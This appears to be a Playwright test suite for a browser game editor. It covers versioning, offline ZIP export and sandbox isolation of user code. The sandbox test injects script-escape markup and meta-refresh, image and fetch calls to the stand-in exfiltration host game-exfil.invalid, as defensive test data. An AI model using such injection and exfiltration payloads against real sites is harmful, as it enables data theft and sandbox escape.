import { randomUUID } from "node:crypto";
import { readFile } from "node:fs/promises";
import { pathToFileURL } from "node:url";
import { unzipSync, strFromU8 } from "fflate";
import { expect, test, type Page, type APIRequestContext } from "@playwright/test";

test.setTimeout(60000);
async function open(page: Page, request: APIRequestContext) {
  const created = await request.post("/api/v1/projects", {
    data: { initial_message: "Game development acceptance", client_message_id: randomUUID() }
  });
  expect(created.ok()).toBe(true);
  const id = ((await created.json()) as { project: { id: string } }).project.id;
  expect(
    (
      await request.put(`/api/v1/projects/${id}/autonomy-profile`, {
        data: { base_level: "A2", overrides: [], expected_version: 1 }
      })
    ).ok()
  ).toBe(true);
  await page.goto(`/?surface=games&project=${id}`);
  await page.getByRole("combobox", { name: "Проект игры", exact: true }).selectOption(id);
  await page
    .getByRole("textbox", { name: "Что создаём?", exact: true })
    .fill("E2E_GAME_SOURCE: разработай игру с собственной механикой");
  await page.getByRole("button", { name: "Создать игру", exact: true }).click();
  await expect(page.getByRole("status").filter({ hasText: "Прототип готов" })).toBeVisible();
  await page.getByRole("button", { name: "Открыть игру в редакторе", exact: true }).click();
  const canvas = page.getByRole("region", { name: "Редактор Canvas", exact: true });
  const code = canvas.getByRole("textbox", { name: "game.js", exact: true });
  await expect(code).toHaveValue(/game.onUpdate/);
  return { id, canvas, code, frame: page.frameLocator('iframe[title="Проект игры Kosmora"]') };
}

test("develops a custom game, versions source files and exports an offline source project", async ({
  page,
  request,
  browser
}, info) => {
  const { id, canvas, code, frame } = await open(page, request);
  await canvas.getByRole("button", { name: "Сохранить версию", exact: true }).click();
  await expect(canvas.getByRole("status")).toContainText("Артефакт создан");
  const original = await code.inputValue();
  await code.fill("");
  await expect(code).toBeVisible();
  await expect(canvas.getByRole("button", { name: "Запустить игру", exact: true })).toBeDisabled();
  await code.fill(original.replace("let x=80", "let x=160"));
  const edited = await code.inputValue();
  await canvas.getByRole("button", { name: "Сохранить версию", exact: true }).click();
  await expect(canvas.getByRole("status")).toContainText("Сохранена новая версия");
  await canvas.getByRole("button", { name: "Запустить игру", exact: true }).click();
  await expect(frame.locator("#game-status")).toHaveText("Игра запущена");
  await expect(frame.getByRole("list", { name: "Консоль игры" })).toContainText(
    "Source game ready"
  );
  const stage = frame.locator("#game-stage");
  const before = await stage.screenshot();
  await stage.focus();
  await page.keyboard.down("ArrowRight");
  await page.waitForTimeout(250);
  await page.keyboard.up("ArrowRight");
  expect((await stage.screenshot()).equals(before)).toBe(false);
  await page.screenshot({ path: info.outputPath("games-development.png"), fullPage: true });
  await canvas.getByRole("button", { name: "Остановить игру", exact: true }).click();
  await expect(page.locator('iframe[title="Проект игры Kosmora"]')).toHaveCount(0);
  const download = page.waitForEvent("download");
  await canvas.getByRole("button", { name: "Скачать проект ZIP", exact: true }).click();
  const file = await download;
  const files = unzipSync(await readFile(await file.path()));
  expect(Object.keys(files).sort()).toEqual([
    "README.txt",
    "game.js",
    "index.html",
    "project.json",
    "scene.html",
    "styles.css"
  ]);
  expect(strFromU8(files["game.js"]!)).toBe(edited);
  const html = info.outputPath("index.html");
  const { writeFile } = await import("node:fs/promises");
  await writeFile(html, files["index.html"]!);
  const offline = await browser.newContext({ offline: true });
  try {
    const local = await offline.newPage();
    await local.goto(pathToFileURL(html).href);
    await local.getByRole("button", { name: "Запустить заново", exact: true }).click();
    await expect(local.locator("#game-status")).toHaveText("Игра запущена");
    await expect(local.locator("#game-log")).toContainText("Source game ready");
    await local.getByRole("button", { name: "Остановить", exact: true }).click();
    await expect(local.locator("#game-status")).toHaveText("Остановлено");
  } finally {
    await offline.close();
  }
  await page.reload();
  await page.getByRole("combobox", { name: "Проект игры", exact: true }).selectOption(id);
  await canvas
    .getByRole("navigation", { name: "Артефакты проекта" })
    .getByRole("button", { name: /Звёздный пилот.*v2/ })
    .click();
  await expect(code).toHaveValue(edited);
});

test("isolates custom JavaScript from DOM and network, displays errors and terminates stuck code", async ({
  page,
  request
}) => {
  const { canvas, code, frame } = await open(page, request);
  const responses: string[] = [];
  page.on("response", (r) => {
    if (r.url().includes("game-exfil.invalid")) responses.push(r.url());
  });
  await canvas.getByRole("button", { name: "scene.html", exact: true }).click();
  await canvas
    .getByRole("textbox", { name: "scene.html", exact: true })
    .fill(
      '<h1>Safe scene</h1><meta http-equiv="refresh" content="0;url=https://game-exfil.invalid"><img src="https://game-exfil.invalid/img"><script>parent.__gameEscape=true</script>'
    );
  await canvas.getByRole("button", { name: "styles.css", exact: true }).click();
  await canvas
    .getByRole("textbox", { name: "styles.css", exact: true })
    .fill("body{background:#fff}</style><script>parent.__gameEscape=true</script><style>");
  await canvas.getByRole("button", { name: "game.js", exact: true }).click();
  await code.fill(`console.log('DOM='+typeof document+';WINDOW='+typeof window);
fetch('https://game-exfil.invalid/private').catch(()=>console.log('network-blocked'));
game.onUpdate=()=>{game.ctx.fillRect(0,0,20,20);};`);
  await canvas.getByRole("button", { name: "Запустить игру", exact: true }).click();
  await expect(frame.locator("#game-log")).toContainText("DOM=undefined;WINDOW=undefined");
  await expect(frame.locator("#game-log")).toContainText("network-blocked");
  expect(responses).toEqual([]);
  expect(await page.evaluate(() => Reflect.get(window, "__gameEscape"))).toBeUndefined();
  expect(await page.locator('iframe[title="Проект игры Kosmora"]').getAttribute("sandbox")).toBe(
    "allow-scripts"
  );
  await code.fill("game.onUpdate=()=>{throw Error('real-game-error');};");
  await expect(page.locator('iframe[title="Проект игры Kosmora"]')).toHaveCount(0);
  await canvas.getByRole("button", { name: "Запустить игру", exact: true }).click();
  await expect(frame.locator("#game-status")).toHaveText("Ошибка в game.js");
  await expect(frame.locator("#game-log")).toContainText("real-game-error");
  await code.fill("const broken = ;");
  await canvas.getByRole("button", { name: "Запустить игру", exact: true }).click();
  await expect(frame.locator("#game-status")).toHaveText("Ошибка в game.js");
  await expect(frame.locator("#game-log")).toContainText("Unexpected");
  await code.fill("while(true){};");
  await canvas.getByRole("button", { name: "Запустить игру", exact: true }).click();
  await expect(frame.locator("#game-status")).toHaveText("Код не отвечает: запуск остановлен", {
    timeout: 7000
  });
  // The host stays responsive even when the worker loops forever.
  await canvas.getByRole("button", { name: "Остановить игру", exact: true }).click();
  await expect(page.locator('iframe[title="Проект игры Kosmora"]')).toHaveCount(0);
});
